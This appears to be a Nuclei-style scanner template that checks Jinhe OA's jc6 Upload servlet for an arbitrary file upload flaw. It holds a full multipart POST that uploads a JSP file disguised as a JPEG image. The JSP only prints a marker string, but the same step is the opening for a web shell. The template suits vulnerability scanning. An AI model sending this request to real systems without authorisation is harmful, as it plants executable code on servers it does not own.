id: jinheOA-jc6-Upload

info:
  name: 金和OA_jc6_Upload任意文件上传
  author: cnaq
  severity: high
  description: 金和OA_jc6_Upload任意文件上传
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_jc6_Upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
  tags: jinheOA,download,file,read

requests:
  - raw:
      - |
        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 197
        Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d

        --ee055230808ca4602e92d0b7c4ecc63d
        Content-Disposition: form-data; name="img"; filename="1.jsp"
        Content-Type: image/jpeg

        <% out.println("tteesstt1"); %>
        --ee055230808ca4602e92d0b7c4ecc63d--

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'Array'